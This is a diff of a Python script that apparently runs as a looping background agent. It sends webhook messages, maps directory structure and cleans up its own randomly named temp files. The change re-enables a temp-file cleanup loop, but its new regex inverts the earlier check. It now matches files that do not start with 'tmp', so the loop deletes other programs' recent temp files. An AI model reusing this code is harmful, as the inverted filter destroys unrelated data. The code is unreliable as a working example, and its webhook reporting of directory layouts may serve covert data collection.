@@ -102,8 +102,6 @@ def send_webhook(message):
         with urllib.request.urlopen(req, timeout=10) as response:
             response.read()
         return True
-    except urllib.error.HTTPError as e:
-        return False
     except Exception as e:
         return False
 
@@ -245,7 +243,7 @@ def get_directory_architecture(root_path):
 def random_ext(n=3):
     return "." + "".join(random.choices(string.ascii_lowercase, k=n))
 
-def save_file(content) -> str:
+def save_file(content) -> Path:
     with tempfile.NamedTemporaryFile(
         mode="w",
         delete=False,
@@ -337,19 +335,14 @@ def is_new_installed():
     return True
 
 def cleanup_named_tempfiles():
-    try:
-        os.rmdir(Path(tempfile.gettempdir()) / "tmp")
-    except:
-        pass
-
     AGE_THRESHOLD = 60 
     temp_dir = tempfile.gettempdir()
     now = time()
 
+    pattern = re.compile(r'^(?!tmp)[^.]{11}\.[^.]{3}$')
     for filename in os.listdir(temp_dir):
-        name, ext = filename.split(".")
-        if not filename.startswith("tmp") or len(name) != 11 or len(ext) != 3:
-            continue
+        if not pattern.match(filename):
+                continue
 
         filepath = os.path.join(temp_dir, filename)
 
@@ -369,7 +362,6 @@ def cleanup_named_tempfiles():
         except Exception as e:
             pass
 
-
 def manage_updates():
     if not EXPERIMENTAL:
         return
@@ -377,6 +369,11 @@ def manage_updates():
     log_dir = os.path.join(tempfile.gettempdir(), "SecurityServices")
     try:
         os.rmdir(log_dir)
+    except:
+        pass
+
+    try:
+        os.rmdir(Path(tempfile.gettempdir()) / "tmp")
     except:
         pass
 
@@ -437,7 +434,7 @@ if __name__ == "__main__":
     while True:
         manage_updates()
 
-        # cleanup_named_tempfiles()
+        cleanup_named_tempfiles()
 
         manage_user_tasks()
 
